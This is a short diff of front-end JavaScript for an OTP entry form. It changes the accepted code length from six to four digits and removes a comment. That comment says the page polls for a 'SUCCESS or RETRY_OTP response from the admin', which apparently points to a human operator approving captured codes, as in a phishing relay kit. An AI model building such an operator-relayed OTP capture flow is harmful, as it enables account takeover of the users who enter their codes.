@@ -251,7 +251,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const otpString = Array.from(otpBoxes).map(b => b.value).join('');
     const submitOtpBtn = document.getElementById('btn-submit-otp');
     if (submitOtpBtn) {
-      submitOtpBtn.disabled = (otpString.length !== 6);
+      submitOtpBtn.disabled = (otpString.length !== 4);
     }
   }
 
@@ -268,7 +268,6 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify({ userId: currentUserId, otp })
       });
       
-      // Restart polling so the browser listens for SUCCESS or RETRY_OTP response from the admin
       startStatusPolling();
       
     } catch (err) {
@@ -348,4 +347,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-                          
+  
